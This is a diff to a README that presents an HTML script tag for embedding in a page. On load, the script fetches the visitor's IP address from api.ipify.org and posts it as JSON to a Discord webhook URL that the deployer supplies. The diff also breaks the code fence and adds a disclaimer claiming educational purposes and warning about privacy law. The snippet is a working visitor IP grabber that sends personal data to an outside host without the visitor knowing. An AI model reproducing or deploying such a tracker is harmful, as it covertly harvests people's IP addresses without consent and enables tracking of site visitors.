@@ -17,7 +17,7 @@ The script leverages JavaScript's `fetch` API to dispatch a GET request to `http
 
 Simply include the script in your HTML file. Just make sure to replace **`YOUR_DISCORD_WEBHOOK`** with your actual Discord webhook URL.
 
-```html
+``html
 <script>
   fetch('https://api.ipify.org')
     .then(response => response.text())
@@ -26,4 +26,10 @@ Simply include the script in your HTML file. Just make sure to replace **`YOUR_D
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ content: ip })
     }));
-</script>
+</script>``
+
+
+
+## Disclaimer
+
+This script is intended for educational purposes only. Any use of this script to collect or share users' IP addresses without their consent may violate privacy laws and ethical principles. Ensure compliance with all relevant regulations and obtain proper authorization before deploying such functionality. Use at your own risk.
